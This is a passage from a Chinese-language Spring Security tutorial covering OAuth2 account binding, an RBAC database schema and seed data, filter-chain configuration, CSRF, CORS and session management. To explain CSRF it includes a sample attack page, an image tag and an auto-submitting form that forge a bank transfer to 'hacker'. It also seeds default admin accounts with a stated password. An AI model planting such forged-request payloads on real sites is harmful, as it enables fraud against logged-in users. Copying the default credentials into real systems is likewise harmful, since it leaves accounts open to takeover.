        } else if (email != null && userRepository.existsByEmail(email)) {
            // 邮箱已注册，自动绑定
            localUser = userRepository.findByEmail(email).orElseThrow();
            SocialBind bind = SocialBind.builder()
                .user(localUser).provider(registrationId).openId(oauthId).build();
            socialBindRepository.save(bind);
        } else {
            // 新用户，自动注册
            localUser = new SysUser();
            localUser.setUsername(registrationId + "_" + oauthId);
            localUser.setNickname(name);
            localUser.setEmail(email);
            localUser.setAvatar(avatar);
            localUser.setPassword(""); // OAuth2 用户没有密码
            localUser.setStatus(1);
            userRepository.save(localUser);

            SocialBind bind = SocialBind.builder()
                .user(localUser).provider(registrationId).openId(oauthId).build();
            socialBindRepository.save(bind);
        }

        // 5. 返回自定义的 OAuth2User
        return new CustomOAuth2User(oAuth2User, localUser);
    }
}
```
---

# Part 6: RBAC 权限模型实现

## 6.1 RBAC 模型概述

```
RBAC（Role-Based Access Control）基于角色的访问控制模型：

用户 → 角色 → 权限（三层结构）

+-------------------+    +-------------------+    +-------------------+
|       用户         |    |       角色         |    |      权限          |
+-------------------+    +-------------------+    +-------------------+
| admin             |───>| 超级管理员          |───>| system:user:list  |
| manager_zhang     |───>| 部门经理            |    | system:user:add   |
| user_li           |───>| 普通用户            |    | system:user:edit  |
+-------------------+    | 审核员              |    | system:user:delete|
                         +-------------------+    | system:role:list  |
                                                  | report:view       |
                                                  | profile:view      |
                                                  | profile:edit      |
                                                  +-------------------+

五张核心表：
  sys_user            ← 用户信息
  sys_role            ← 角色信息
  sys_permission      ← 权限/菜单信息（树形结构）
  sys_user_role       ← 用户-角色 中间表
  sys_role_permission ← 角色-权限 中间表

权限类型（type字段）：
  1 = 目录（菜单组，不对应实际页面）
  2 = 菜单（对应前端页面）
  3 = 按钮（对应前端操作按钮/后端接口）

数据例子：
  用户 "manager_zhang" 拥有角色 ["部门经理"]
  "部门经理" 角色拥有权限 ["report:view", "profile:view", "profile:edit", "employee:read"]
  
  前端根据权限动态渲染菜单和按钮
  后端用 @PreAuthorize("hasAuthority('report:view')") 控制接口访问
```

---

## 6.2 数据库表结构（完整建表 SQL）

```sql
-- =============================================================
-- Spring Security RBAC 权限系统 - 完整建表脚本
-- 数据库：MySQL 8.0+
-- =============================================================

CREATE DATABASE IF NOT EXISTS `security_rbac` 
  CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

USE `security_rbac`;

-- ─── 用户表 ───────────────────────────────────────────────────
CREATE TABLE `sys_user` (
  `id`            BIGINT       NOT NULL AUTO_INCREMENT                        COMMENT '主键',
  `username`      VARCHAR(50)  NOT NULL                                       COMMENT '登录用户名',
  `password`      VARCHAR(100) NOT NULL                                       COMMENT 'BCrypt加密密码',
  `nickname`      VARCHAR(50)           DEFAULT ''                            COMMENT '昵称',
  `email`         VARCHAR(100)          DEFAULT ''                            COMMENT '邮箱',
  `phone`         VARCHAR(20)           DEFAULT ''                            COMMENT '手机号',
  `avatar`        VARCHAR(500)          DEFAULT ''                            COMMENT '头像URL',
  `gender`        TINYINT               DEFAULT 0                             COMMENT '性别：0未知 1男 2女',
  `dept_id`       BIGINT                                                      COMMENT '部门ID',
  `status`        TINYINT      NOT NULL DEFAULT 1                             COMMENT '状态：1启用 0禁用',
  `login_ip`      VARCHAR(50)           DEFAULT ''                            COMMENT '最后登录IP',
  `login_date`    DATETIME                                                    COMMENT '最后登录时间',
  `create_by`     VARCHAR(50)           DEFAULT ''                            COMMENT '创建者',
  `create_time`   DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP            COMMENT '创建时间',
  `update_by`     VARCHAR(50)           DEFAULT ''                            COMMENT '更新者',
  `update_time`   DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP
                                        ON UPDATE CURRENT_TIMESTAMP           COMMENT '更新时间',
  `remark`        VARCHAR(500)          DEFAULT ''                            COMMENT '备注',
  `deleted`       TINYINT      NOT NULL DEFAULT 0                             COMMENT '逻辑删除：0否 1是',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_username` (`username`),
  KEY `idx_dept_id` (`dept_id`),
  KEY `idx_status` (`status`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='用户信息表';

-- ─── 角色表 ───────────────────────────────────────────────────
CREATE TABLE `sys_role` (
  `id`            BIGINT       NOT NULL AUTO_INCREMENT                        COMMENT '主键',
  `role_name`     VARCHAR(50)  NOT NULL                                       COMMENT '角色名称',
  `role_key`      VARCHAR(50)  NOT NULL                                       COMMENT '角色编码（英文唯一标识）',
  `role_sort`     INT          NOT NULL DEFAULT 0                             COMMENT '排序',
  `data_scope`    TINYINT               DEFAULT 1                             COMMENT '数据范围：1全部 2本部门及下级 3本部门 4本人',
  `status`        TINYINT      NOT NULL DEFAULT 1                             COMMENT '状态：1启用 0禁用',
  `create_time`   DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP            COMMENT '创建时间',
  `update_time`   DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP
                                        ON UPDATE CURRENT_TIMESTAMP           COMMENT '更新时间',
  `remark`        VARCHAR(500)          DEFAULT ''                            COMMENT '备注',
  `deleted`       TINYINT      NOT NULL DEFAULT 0                             COMMENT '逻辑删除',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_role_key` (`role_key`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='角色信息表';

-- ─── 权限/菜单表（树形结构）───────────────────────────────────
CREATE TABLE `sys_permission` (
  `id`            BIGINT       NOT NULL AUTO_INCREMENT                        COMMENT '主键',
  `parent_id`     BIGINT       NOT NULL DEFAULT 0                             COMMENT '父节点ID（0=根节点）',
  `perm_name`     VARCHAR(50)  NOT NULL                                       COMMENT '权限名称',
  `perm_key`      VARCHAR(100)          DEFAULT ''                            COMMENT '权限编码（如：system:user:list）',
  `perm_type`     TINYINT      NOT NULL DEFAULT 1                             COMMENT '类型：1目录 2菜单 3按钮/接口',
  `order_num`     INT          NOT NULL DEFAULT 0                             COMMENT '排序',
  `path`          VARCHAR(200)          DEFAULT ''                            COMMENT '路由地址（前端路由）',
  `component`     VARCHAR(255)          DEFAULT ''                            COMMENT '组件路径（前端）',
  `icon`          VARCHAR(100)          DEFAULT ''                            COMMENT '图标',
  `url`           VARCHAR(255)          DEFAULT ''                            COMMENT '接口URL（后端）',
  `method`        VARCHAR(10)           DEFAULT ''                            COMMENT 'HTTP方法：GET/POST/PUT/DELETE',
  `is_frame`      TINYINT               DEFAULT 0                             COMMENT '是否外链：1是 0否',
  `is_cache`      TINYINT               DEFAULT 0                             COMMENT '是否缓存：1是 0否',
  `visible`       TINYINT               DEFAULT 1                             COMMENT '菜单是否可见：1是 0否',
  `status`        TINYINT      NOT NULL DEFAULT 1                             COMMENT '状态：1启用 0禁用',
  `create_time`   DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP            COMMENT '创建时间',
  `update_time`   DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP
                                        ON UPDATE CURRENT_TIMESTAMP           COMMENT '更新时间',
  `deleted`       TINYINT      NOT NULL DEFAULT 0                             COMMENT '逻辑删除',
  PRIMARY KEY (`id`),
  KEY `idx_parent_id` (`parent_id`),
  KEY `idx_perm_type` (`perm_type`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='权限菜单表';

-- ─── 用户-角色 关联表 ──────────────────────────────────────────
CREATE TABLE `sys_user_role` (
  `user_id`   BIGINT NOT NULL COMMENT '用户ID',
  `role_id`   BIGINT NOT NULL COMMENT '角色ID',
  PRIMARY KEY (`user_id`, `role_id`),
  KEY `idx_role_id` (`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='用户角色关联表';

-- ─── 角色-权限 关联表 ──────────────────────────────────────────
CREATE TABLE `sys_role_permission` (
  `role_id`   BIGINT NOT NULL COMMENT '角色ID',
  `perm_id`   BIGINT NOT NULL COMMENT '权限ID',
  PRIMARY KEY (`role_id`, `perm_id`),
  KEY `idx_perm_id` (`perm_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='角色权限关联表';

-- =============================================================
-- 初始化数据
-- =============================================================

-- 初始角色
INSERT INTO `sys_role` (`role_name`, `role_key`, `role_sort`, `data_scope`) VALUES
('超级管理员', 'super_admin', 1, 1),
('系统管理员', 'admin',       2, 2),
('普通用户',   'user',        3, 4);

-- 初始权限树
INSERT INTO `sys_permission` (`parent_id`, `perm_name`, `perm_key`, `perm_type`, `order_num`, `path`, `icon`) VALUES
-- 顶级目录
(0, '系统管理',     '',                    1, 1, '/system',         'setting'),
(0, '个人中心',     '',                    1, 9, '/profile',        'user'),
-- 系统管理 → 子菜单
(1, '用户管理',     '',                    2, 1, '/system/user',    'user-manage'),
(1, '角色管理',     '',                    2, 2, '/system/role',    'role'),
(1, '权限管理',     '',                    2, 3, '/system/perm',    'lock'),
-- 用户管理 → 按钮权限
(3, '用户列表',     'system:user:list',   3, 1, '', ''),
(3, '新增用户',     'system:user:add',    3, 2, '', ''),
(3, '编辑用户',     'system:user:edit',   3, 3, '', ''),
(3, '删除用户',     'system:user:delete', 3, 4, '', ''),
(3, '重置密码',     'system:user:reset',  3, 5, '', ''),
(3, '导出用户',     'system:user:export', 3, 6, '', ''),
-- 角色管理 → 按钮权限
(4, '角色列表',     'system:role:list',   3, 1, '', ''),
(4, '新增角色',     'system:role:add',    3, 2, '', ''),
(4, '编辑角色',     'system:role:edit',   3, 3, '', ''),
(4, '删除角色',     'system:role:delete', 3, 4, '', ''),
-- 个人中心
(2, '查看个人信息', 'profile:view',       3, 1, '', ''),
(2, '修改个人信息', 'profile:edit',       3, 2, '', ''),
(2, '修改密码',     'profile:password',   3, 3, '', '');

-- 给超级管理员分配所有权限
INSERT INTO `sys_role_permission` (`role_id`, `perm_id`)
SELECT 1, `id` FROM `sys_permission` WHERE `perm_type` = 3 AND `status` = 1;

-- 给管理员分配部分权限
INSERT INTO `sys_role_permission` (`role_id`, `perm_id`) VALUES
(2, 6), (2, 7), (2, 8), (2, 9),   -- 用户管理权限
(2, 12), (2, 13), (2, 14);         -- 角色管理权限

-- 给普通用户分配个人中心权限
INSERT INTO `sys_role_permission` (`role_id`, `perm_id`) VALUES
(3, 15), (3, 16), (3, 17);

-- 初始用户（密码：Admin@123）
INSERT INTO `sys_user` (`username`, `password`, `nickname`, `email`, `status`) VALUES
('admin',  '$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy', '超级管理员', 'admin@example.com', 1),
('manager','$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy', '系统管理员', 'manager@example.com', 1),
('user01', '$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy', '普通用户1', 'user01@example.com', 1);

-- 分配角色
INSERT INTO `sys_user_role` VALUES (1, 1), (2, 2), (3, 3);
```

---

## 6.3 核心 Entity 实体类

```java
// SysUser.java
@Entity
@Table(name = "sys_user")
@Data
@NoArgsConstructor
@EntityListeners(AuditingEntityListener.class)
public class SysUser {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false, unique = true, length = 50)
    private String username;

    @Column(nullable = false, length = 100)
    @JsonIgnore
    private String password;

    private String nickname;
    private String email;
    private String phone;
    private String avatar;

    @Column(nullable = false)
    private Integer status = 1;

    @Column(name = "login_ip")
    private String loginIp;

    @Column(name = "login_date")
    private LocalDateTime loginDate;

    @CreatedDate
    @Column(name = "create_time", updatable = false)
    private LocalDateTime createTime;

    @LastModifiedDate
    @Column(name = "update_time")
    private LocalDateTime updateTime;

    @Column(nullable = false)
    private Integer deleted = 0;

    // 多对多：用户 → 角色
    @ManyToMany(fetch = FetchType.LAZY)
    @JoinTable(
        name = "sys_user_role",
        joinColumns = @JoinColumn(name = "user_id"),
        inverseJoinColumns = @JoinColumn(name = "role_id")
    )
    private Set<SysRole> roles = new HashSet<>();
}

// SysRole.java
@Entity
@Table(name = "sys_role")
@Data
@NoArgsConstructor
public class SysRole {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(name = "role_name", nullable = false, length = 50)
    private String roleName;

    @Column(name = "role_key", nullable = false, unique = true, length = 50)
    private String roleKey;

    @Column(name = "role_sort")
    private Integer roleSort = 0;

    private Integer status = 1;
    private Integer deleted = 0;

    // 多对多：角色 → 权限
    @ManyToMany(fetch = FetchType.LAZY)
    @JoinTable(
        name = "sys_role_permission",
        joinColumns = @JoinColumn(name = "role_id"),
        inverseJoinColumns = @JoinColumn(name = "perm_id")
    )
    private Set<SysPermission> permissions = new HashSet<>();
}

// SysPermission.java
@Entity
@Table(name = "sys_permission")
@Data
@NoArgsConstructor
public class SysPermission {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(name = "parent_id")
    private Long parentId = 0L;

    @Column(name = "perm_name", nullable = false, length = 50)
    private String permName;

    @Column(name = "perm_key", length = 100)
    private String permKey;   // 如：system:user:list

    @Column(name = "perm_type")
    private Integer permType;  // 1目录 2菜单 3按钮/接口

    @Column(name = "order_num")
    private Integer orderNum = 0;

    private String path;        // 前端路由
    private String component;   // 前端组件
    private String icon;
    private String url;         // 后端接口路径
    private String method;      // HTTP方法
    private Integer visible = 1;
    private Integer status = 1;
    private Integer deleted = 0;

    // 子节点（树形结构，不存DB，用于构建菜单树）
    @Transient
    private List<SysPermission> children = new ArrayList<>();
}
```

---

## 6.4 动态权限加载实现

```java
// UserDetailsService：从 DB 加载用户+角色+权限
@Service
@RequiredArgsConstructor
public class RbacUserDetailsService implements UserDetailsService {

    private final SysUserRepository userRepo;
    private final SysRoleRepository roleRepo;
    private final SysPermissionRepository permRepo;

    @Override
    @Transactional(readOnly = true)
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        // 1. 查用户
        SysUser user = userRepo.findByUsernameAndDeletedFalse(username)
            .orElseThrow(() -> new UsernameNotFoundException("用户不存在: " + username));

        // 2. 查角色编码
        List<String> roleCodes = roleRepo.findRoleKeysByUserId(user.getId());

        // 3. 查权限编码（所有角色的权限合并）
        List<String> permCodes;
        if (roleCodes.contains("super_admin")) {
            // 超级管理员拥有所有权限
            permCodes = permRepo.findAllPermKeys();
        } else {
            permCodes = permRepo.findPermKeysByUserId(user.getId());
        }

        return new LoginUser(user, roleCodes, permCodes);
    }
}

// Repository 查询
@Repository
public interface SysRoleRepository extends JpaRepository<SysRole, Long> {

    @Query(value = """
        SELECT r.role_key FROM sys_role r
        INNER JOIN sys_user_role ur ON r.id = ur.role_id
        WHERE ur.user_id = :userId AND r.status = 1 AND r.deleted = 0
        """, nativeQuery = true)
    List<String> findRoleKeysByUserId(@Param("userId") Long userId);
}

@Repository
public interface SysPermissionRepository extends JpaRepository<SysPermission, Long> {

    @Query(value = """
        SELECT DISTINCT p.perm_key FROM sys_permission p
        INNER JOIN sys_role_permission rp ON p.id = rp.perm_id
        INNER JOIN sys_role r ON r.id = rp.role_id
        INNER JOIN sys_user_role ur ON r.id = ur.role_id
        WHERE ur.user_id = :userId
          AND r.status = 1 AND r.deleted = 0
          AND p.perm_type = 3 AND p.status = 1 AND p.deleted = 0
          AND p.perm_key IS NOT NULL AND p.perm_key != ''
        """, nativeQuery = true)
    List<String> findPermKeysByUserId(@Param("userId") Long userId);

    @Query(value = """
        SELECT perm_key FROM sys_permission
        WHERE perm_type = 3 AND status = 1 AND deleted = 0
          AND perm_key IS NOT NULL AND perm_key != ''
        """, nativeQuery = true)
    List<String> findAllPermKeys();
}
```

---

## 6.5 菜单权限树构建（前端动态路由）

```java
@Service
@RequiredArgsConstructor
public class MenuService {

    private final SysPermissionRepository permRepo;

    /**
     * 获取当前用户的菜单树（用于前端动态路由）
     */
    public List<SysPermission> getUserMenuTree() {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        LoginUser loginUser = (LoginUser) auth.getPrincipal();

        List<SysPermission> menus;

        // 超级管理员返回所有菜单
        if (loginUser.getRoleCodes().contains("super_admin")) {
            menus = permRepo.findVisibleMenusAll();
        } else {
            menus = permRepo.findVisibleMenusByUserId(loginUser.getUserId());
        }

        // 构建树形结构
        return buildTree(menus, 0L);
    }

    private List<SysPermission> buildTree(List<SysPermission> all, Long parentId) {
        return all.stream()
            .filter(p -> parentId.equals(p.getParentId()))
            .peek(p -> p.setChildren(buildTree(all, p.getId())))
            .sorted(Comparator.comparingInt(SysPermission::getOrderNum))
            .collect(Collectors.toList());
    }
}

// Controller 返回给前端
@RestController
@RequestMapping("/api/system")
public class SystemController {

    @Autowired
    private MenuService menuService;

    /**
     * 获取当前用户菜单树
     * 前端用此接口动态生成路由和菜单
     */
    @GetMapping("/menus")
    public ResponseEntity<ApiResponse<List<SysPermission>>> getMenus() {
        List<SysPermission> menus = menuService.getUserMenuTree();
        return ResponseEntity.ok(ApiResponse.success(menus));
    }

    /**
     * 获取当前用户所有权限编码
     * 前端用此接口控制按钮的显示/隐藏
     */
    @GetMapping("/permissions")
    public ResponseEntity<ApiResponse<List<String>>> getPermissions(
            @AuthenticationPrincipal LoginUser loginUser) {
        return ResponseEntity.ok(ApiResponse.success(loginUser.getPermCodes()));
    }
}
```

```javascript
// 前端（Vue3）根据权限控制按钮显示
// permission.js（自定义指令）
const permissionDirective = {
    mounted(el, binding) {
        const requiredPerm = binding.value;
        const userPerms = store.getters['user/permissions'];

        if (!userPerms.includes(requiredPerm)) {
            el.parentNode?.removeChild(el);
        }
    }
};

// 在模板中使用
// <button v-permission="'system:user:add'">新增用户</button>
// <button v-permission="'system:user:delete'">删除用户</button>
```
---

# Part 7: Spring Security 配置（SecurityFilterChain）

## 7.1 新版配置方式（Spring Security 6.x）

### 废弃 WebSecurityConfigurerAdapter

```
Spring Security 5.7+ 废弃了 WebSecurityConfigurerAdapter：

旧方式（已废弃，不推荐）：
  @Configuration
  public class SecurityConfig extends WebSecurityConfigurerAdapter {
      @Override
      protected void configure(HttpSecurity http) throws Exception { ... }
      @Override
      protected void configure(AuthenticationManagerBuilder auth) throws Exception { ... }
  }

新方式（推荐，Spring Security 6.x）：
  @Configuration
  @EnableWebSecurity
  public class SecurityConfig {
      @Bean
      public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception { ... }
      @Bean
      public AuthenticationManager authenticationManager(AuthenticationConfiguration config) { ... }
  }

优点：
  ✓ 更符合 Spring Boot 自动配置理念
  ✓ 支持多个 SecurityFilterChain（不同路径不同安全策略）
  ✓ Bean 式声明，更灵活可测试
  ✓ 组件化：每个安全配置都是一个 Bean，易于复用
```

### 完整配置模板

```java
package com.example.security.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.config.annotation.authentication.configuration.AuthenticationConfiguration;
import org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.header.writers.*;

@Configuration
@EnableWebSecurity   // 启用 Spring Security
@EnableMethodSecurity(prePostEnabled = true, securedEnabled = true)
public class SecurityConfig {

    /**
     * 主安全过滤链配置
     * 注意：HttpSecurity 对象不能共享，每个 SecurityFilterChain 需要独立的 HttpSecurity
     */
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            // ════════════════════════════════════
            // 1. CSRF 配置
            // ════════════════════════════════════
            // 前后端分离 + JWT → 禁用 CSRF（JWT 天然防 CSRF）
            .csrf(AbstractHttpConfigurer::disable)
            // 传统 Session 应用 → 启用 CSRF（默认开启）
            // .csrf(csrf -> csrf
            //     .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            // )

            // ════════════════════════════════════
            // 2. CORS 跨域配置
            // ════════════════════════════════════
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))

            // ════════════════════════════════════
            // 3. Session 管理
            // ════════════════════════════════════
            .sessionManagement(session -> session
                // JWT 无状态：STATELESS（不创建/使用 Session）
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
                // 传统 Session：其他选项：
                // IF_REQUIRED（默认，按需创建）
                // ALWAYS（始终创建）
                // NEVER（不创建，但会使用已有的）
            )

            // ════════════════════════════════════
            // 4. 安全响应头
            // ════════════════════════════════════
            .headers(headers -> headers
                // 防点击劫持（X-Frame-Options）
                .frameOptions(frame -> frame.sameOrigin())
                // 禁用 XSS 过滤器头（现代浏览器默认关闭，用 CSP 代替）
                .xssProtection(xss -> xss.disable())
                // 内容安全策略
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; " +
                        "script-src 'self' 'unsafe-inline'; " +
                        "style-src 'self' 'unsafe-inline'; " +
                        "img-src 'self' data: https:; " +
                        "connect-src 'self' https://api.example.com"
                    )
                )
                // HTTP Strict Transport Security（强制 HTTPS）
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000)
                )
                // 禁止内容类型嗅探
                .contentTypeOptions(Customizer.withDefaults())
                // 防缓存（敏感数据）
                .cacheControl(Customizer.withDefaults())
            )

            // ════════════════════════════════════
            // 5. URL 权限配置
            // ════════════════════════════════════
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/**").permitAll()
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/swagger-ui/**", "/v3/api-docs/**").permitAll()
                .requestMatchers("/actuator/health").permitAll()
                .anyRequest().authenticated()
            )

            // ════════════════════════════════════
            // 6. 异常处理
            // ════════════════════════════════════
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint(authEntryPoint)
                .accessDeniedHandler(accessDeniedHandler)
            )

            // ════════════════════════════════════
            // 7. 添加自定义过滤器
            // ════════════════════════════════════
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);

        return http.build();
    }

    /**
     * CORS 跨域配置
     */
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowedOriginPatterns(List.of("http://localhost:3000", "https://*.myapp.com"));
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"));
        config.setAllowedHeaders(List.of("*"));
        config.setExposedHeaders(List.of("Authorization", "Refresh-Token", "X-Total-Count"));
        config.setAllowCredentials(true);
        config.setMaxAge(3600L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", config);
        return source;
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    public AuthenticationManager authenticationManager(
            AuthenticationConfiguration config) throws Exception {
        return config.getAuthenticationManager();
    }
}
```

---

## 7.2 CSRF 保护详解

### CSRF 攻击原理

```
CSRF（Cross-Site Request Forgery）跨站请求伪造：

正常场景：
  用户 → 登录银行网站 → 获取 Session Cookie
  用户 → 点击转账 → 浏览器自动携带 Cookie → 银行执行转账

攻击场景：
  用户已登录银行网站（Session 有效）
  用户访问恶意网站（含以下代码）：
  
  <img src="https://bank.com/transfer?to=hacker&amount=10000" />
  <!-- 或者 -->
  <form action="https://bank.com/transfer" method="POST" id="csrf-form">
    <input name="to" value="hacker" />
    <input name="amount" value="10000" />
  </form>
  <script>document.getElementById('csrf-form').submit();</script>
  
  浏览器会自动携带 bank.com 的 Cookie！
  → 在用户不知情的情况下执行了转账！

防护方式（SynchronizerToken 模式）：
  1. 服务器生成随机 CSRF Token，存储在 Session 中
  2. 在表单中包含隐藏的 CSRF Token 字段
  3. 服务器验证 Token 是否与 Session 中的一致
  
  恶意网站无法获取 CSRF Token（同源策略限制）
  → 无法伪造合法请求！
```

### CSRF 配置

```java
// 传统 Session 应用：启用 CSRF
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf(csrf -> csrf
            // 方式1：存储在 Cookie 中（适合前后端分离的 Session 应用）
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            // 方式2：自定义排除路径（API 接口不需要 CSRF）
            .ignoringRequestMatchers("/api/**")
        );
    return http.build();
}

// Thymeleaf 模板中自动包含 CSRF Token
// <form th:action="@{/transfer}" method="post">
//     <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}" />
//     ...
// </form>

// JWT 无状态应用：禁用 CSRF
// 原因：CSRF 攻击利用的是 Cookie 自动携带的特性
// JWT 存储在 Authorization Header 中，浏览器不会自动发送
// → JWT 天然防 CSRF
http.csrf(AbstractHttpConfigurer::disable);

// Spring Security 6 的最新 CSRF 配置（处理 SPA + Cookie Token）
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    .csrfTokenRequestHandler(new SpaCsrfTokenRequestHandler())
);

// SpaCsrfTokenRequestHandler：处理 SPA 应用的 CSRF Token
public final class SpaCsrfTokenRequestHandler extends CsrfTokenRequestAttributeHandler {
    private final CsrfTokenRequestHandler delegate = new XorCsrfTokenRequestAttributeHandler();

    @Override
    public void handle(HttpServletRequest request, HttpServletResponse response,
                       Supplier<CsrfToken> csrfToken) {
        this.delegate.handle(request, response, csrfToken);
    }

    @Override
    public String resolveCsrfTokenValue(HttpServletRequest request, CsrfToken csrfToken) {
        // 优先从请求头读取 CSRF Token（适合 AJAX 请求）
        if (StringUtils.hasText(request.getHeader(csrfToken.getHeaderName()))) {
            return super.resolveCsrfTokenValue(request, csrfToken);
        }
        // 其次从表单参数读取
        return this.delegate.resolveCsrfTokenValue(request, csrfToken);
    }
}
```

---

## 7.3 CORS 跨域配置

```java
// 完整的 CORS 配置
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();

    // 允许的来源（精确域名或通配符）
    // 注意：allowCredentials=true 时不能用 "*"，必须精确域名
    config.setAllowedOriginPatterns(Arrays.asList(
        "http://localhost:3000",      // 本地开发
        "http://localhost:8080",
        "https://www.myapp.com",      // 生产环境
        "https://*.myapp.com"         // 子域名（需用Pattern）
    ));

    // 允许的 HTTP 方法
    config.setAllowedMethods(Arrays.asList(
        "GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"
    ));

    // 允许的请求头
    config.setAllowedHeaders(Arrays.asList(
        "Authorization",
        "Content-Type",
        "X-Requested-With",
        "Accept",
        "Origin",
        "Refresh-Token"
    ));

    // 暴露给前端的响应头（前端 JS 可以读取）
    config.setExposedHeaders(Arrays.asList(
        "Authorization",
        "X-Total-Count",
        "Content-Disposition"  // 文件下载时需要
    ));

    // 允许发送 Cookie（JWT 用 Header 不需要这个）
    config.setAllowCredentials(true);

    // 预检请求缓存时间（秒），减少 OPTIONS 请求
    config.setMaxAge(3600L);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}
```

---

## 7.4 会话管理（Session Management）

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .sessionManagement(session -> session
            // ① 会话创建策略
            .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)

            // ② Session 固定攻击防护
            // 登录成功后创建新 Session（默认配置）
            .sessionFixation(fixation -> fixation
                .newSession()           // 创建全新 Session（最安全）
                // .migrateSession()    // 迁移旧 Session 属性（默认）
                // .changeSessionId()   // 只改 Session ID（Servlet 3.1+）
                // .none()              // 不变（不推荐！）
            )

            // ③ 并发会话控制（限制同一用户同时登录数量）
            .maximumSessions(1)         // 最大并发 Session 数
                .expiredSessionStrategy(event -> {
                    HttpServletResponse resp = event.getResponse();
                    resp.setContentType("application/json;charset=UTF-8");
                    resp.getWriter().write("{\"code\":401,\"message\":\"账号已在其他设备登录\"}");
                })
                .sessionRegistry(sessionRegistry())
                // maxSessionsPreventsLogin(true) → 达到上限时拒绝新登录
                // maxSessionsPreventsLogin(false)（默认）→ 踢出最旧的 Session
        );

    return http.build();
}

@Bean
public SessionRegistry sessionRegistry() {
    return new SessionRegistryImpl();
}

// 强制踢出指定用户的 Session（管理员功能）
@Service
@RequiredArgsConstructor
public class SessionManageService {

    private final SessionRegistry sessionRegistry;

    /**
     * 强制下线指定用户
     */
    public void forceLogout(String username) {
        sessionRegistry.getAllPrincipals().stream()
            .filter(p -> p instanceof UserDetails &&
                         ((UserDetails) p).getUsername().equals(username))
            .flatMap(p -> sessionRegistry.getAllSessions(p, false).stream())
            .forEach(SessionInformation::expireNow);
    }

    /**
     * 获取所有在线用户
     */
    public List<String> getOnlineUsers() {
        return sessionRegistry.getAllPrincipals().stream()
            .filter(p -> p instanceof UserDetails)
            .map(p -> ((UserDetails) p).getUsername())
            .collect(Collectors.toList());
    }
}
```

---

## 7.5 异常处理（AuthenticationEntryPoint + AccessDeniedHandler）

```java
/**
 * 统一异常处理（前后端分离场景）
 */

// 未认证处理器（HTTP 401）
@Component
public class RestAuthenticationEntryPoint implements AuthenticationEntryPoint {

    private final ObjectMapper objectMapper;

    public RestAuthenticationEntryPoint(ObjectMapper objectMapper) {
        this.objectMapper = objectMapper;
    }

    @Override
    public void commence(HttpServletRequest request, HttpServletResponse response,
                         AuthenticationException authException) throws IOException {
        response.setContentType(MediaType.APPLICATION_JSON_VALUE);
        response.setCharacterEncoding("UTF-8");
